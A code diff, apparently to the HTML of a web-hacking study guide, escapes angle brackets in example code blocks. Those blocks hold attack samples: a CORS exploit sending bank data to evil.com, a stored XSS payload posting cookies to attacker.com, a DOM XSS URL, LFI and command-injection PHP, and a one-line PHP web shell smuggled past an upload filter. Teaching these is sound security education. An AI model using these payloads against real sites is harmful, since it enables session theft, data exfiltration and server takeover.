@@ -492,7 +492,7 @@ SELECT * FROM users WHERE username='admin'--' AND password='x'
                     <div class="lang-need-item"><span>></span><span>understand PHP type juggling — loose == comparison leading to auth bypass</span></div>
                     <div class="lang-need-item"><span>></span><span>understand PHP wrappers — php://filter, php://input (used in LFI attacks)</span></div>
                     <div class="code-label">// what dangerous PHP code looks like</div>
-                    <div class="code-block"><?php
+                    <div class="code-block">&lt;?php
 // vulnerable to local file inclusion (LFI):
 $page = $_GET['page'];      // user controls this
 include($page . '.php');    // user controls what gets included
@@ -506,7 +506,7 @@ system($cmd);               // executes arbitrary OS commands
 
 // attacker sends: ?cmd=id
 // server responds: uid=33(www-data) — full command execution
-?></div>
+?&gt;</div>
                     <div style="margin-top:14px" class="lang-need-title">where to learn :</div>
                     <div class="lang-need-item"><span>></span><span>PentesterLab — code review exercises (PHP-heavy, free tier available)</span></div>
                     <div class="lang-need-item"><span>></span><span>read HTB writeups that involve source code review</span></div>
@@ -647,8 +647,8 @@ this is what a correctly configured session cookie looks like.</div>
 
 // you host this on evil.com:
 fetch('https://bank.com/api/account', {credentials: 'include'})
-  .then(r => r.json())
-  .then(data => fetch('https://evil.com/steal?d=' + JSON.stringify(data)))
+  .then(r =&gt; r.json())
+  .then(data =&gt; fetch('https://evil.com/steal?d=' + JSON.stringify(data)))
 
 // victim visits evil.com → their browser sends their bank cookies →
 // server allows it (CORS says evil.com is trusted) →
@@ -681,7 +681,7 @@ fetch('https://bank.com/api/account', {credentials: 'include'})
                                 this is how you bypass client-side validation: the browser's JavaScript checks run, but you intercept the request after they run and before it reaches the server — and change whatever you want.
                             </div>
                             <div class="code-label">// bypassing client-side price validation</div>
-                            <div class="code-block">// HTML: <input type="number" name="price" readonly value="99.00">
+                            <div class="code-block">// HTML: &lt;input type="number" name="price" readonly value="99.00"&gt;
 // the field is readonly — you can't change it in the browser.
 // BUT you intercept the checkout POST request in Burp:
 
@@ -1057,11 +1057,11 @@ https://target.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
 // stored — saved to DB, executes for all visitors:
 // posted in a comment field:
-<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+&lt;img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)"&gt;
 
 // DOM — JavaScript reads unsafe input and writes to page:
 // app code: document.getElementById('out').innerHTML = location.hash.slice(1)
-// attacker URL: https://target.com/page#<img src=x onerror=alert(1)></div>
+// attacker URL: https://target.com/page#&lt;img src=x onerror=alert(1)&gt;</div>
                         </div>
                     </div>
                     <div class="item" id="i-xss-impact">
@@ -1188,7 +1188,7 @@ response: base64 string
                             </div>
                             <div class="code-label">// file upload to RCE</div>
                             <div class="code-block">// malicious file: shell.php
-<?php system($_GET['cmd']); ?>
+&lt;?php system($_GET['cmd']); ?&gt;
 
 // server only accepts .jpg → intercept upload in Burp, change:
 Content-Type: image/jpeg   ← was application/php
